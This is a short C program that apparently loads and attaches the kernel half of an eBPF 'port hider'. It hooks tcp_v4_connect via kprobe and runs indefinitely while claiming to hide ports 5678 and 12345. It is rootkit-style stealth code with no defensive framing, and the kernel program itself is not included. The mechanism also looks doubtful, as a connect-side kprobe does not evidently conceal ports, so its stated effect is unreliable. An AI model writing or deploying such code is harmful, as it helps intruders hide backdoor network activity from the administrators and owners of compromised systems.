#include <stdio.h>
#include <stdlib.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include <unistd.h>

int main() {
    struct bpf_object *obj;
    struct bpf_program *prog;
    struct bpf_link *link = NULL;
    int err;

    // Load the BPF object file generated from the eBPF C program
    obj = bpf_object__open_file("port_hider_kern.o", NULL);
    if (libbpf_get_error(obj)) {
        fprintf(stderr, "Failed to open BPF object file\n");
        return 1;
    }

    // Load the BPF program into the kernel
    err = bpf_object__load(obj);
    if (err) {
        fprintf(stderr, "Failed to load BPF object file\n");
        bpf_object__close(obj);
        return 1;
    }

    // Find the eBPF program by section name
    prog = bpf_object__find_program_by_name(obj, "bpf_prog1");
    if (!prog) {
        fprintf(stderr, "Failed to find BPF program\n");
        bpf_object__close(obj);
        return 1;
    }

    // Attach the eBPF program to a kprobe on 'tcp_v4_connect'
    link = bpf_program__attach_kprobe(prog, false /* not a return probe */, "tcp_v4_connect");
    if (libbpf_get_error(link)) {
        fprintf(stderr, "Failed to attach BPF program to kprobe\n");
        bpf_link__destroy(link);
        bpf_object__close(obj);
        return 1;
    }

    printf("eBPF program loaded and attached, hiding ports 5678 and 12345\n");

    // Keep the program running
    while (1) {
        sleep(1);
    }

    // Clean up (in case you ever decide to add a break condition)
    bpf_link__destroy(link);
    bpf_object__close(obj);

    return 0;
}
